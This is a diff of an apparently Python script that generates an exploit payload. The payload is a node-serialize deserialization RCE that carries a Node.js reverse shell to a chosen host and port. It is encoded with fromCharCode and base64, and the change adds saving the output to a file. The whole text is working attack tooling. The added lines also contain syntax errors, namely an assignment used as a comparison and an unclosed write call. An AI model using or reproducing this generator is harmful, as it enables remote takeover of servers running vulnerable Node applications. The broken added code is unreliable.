@@ -54,7 +54,12 @@ c(HOST,PORT);
 print "[+] Encoded"
 PAYLOAD = charencode(NODEJS_REV_SHELL)
 PAYLOAD_Final = "{\"rce\":\"_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))" % (PAYLOAD) + "}()\"}"
-print PAYLOAD_Final + "=="
-PAYLOAD_Encoded = base64.b64encode(PAYLOAD_Final)
+print PAYLOAD_Final
+PAYLOAD_Encoded = base64.b64encode(PAYLOAD_Final) + "%3D%3D"
 print "[+] B64 Encoded"
-print PAYLOAD_Encoded + "%3D%3D"
+print PAYLOAD_Encoded
+if input("save to file?[y][n]: ") = "y"
+    f= open("rvshell_out.txt","w+")
+    f.write("\n[+] Encoded\n" + PAYLOAD_Final + "\n[+] B64 Encoded\n" + PAYLOAD_Encoded
+    f.close()
+
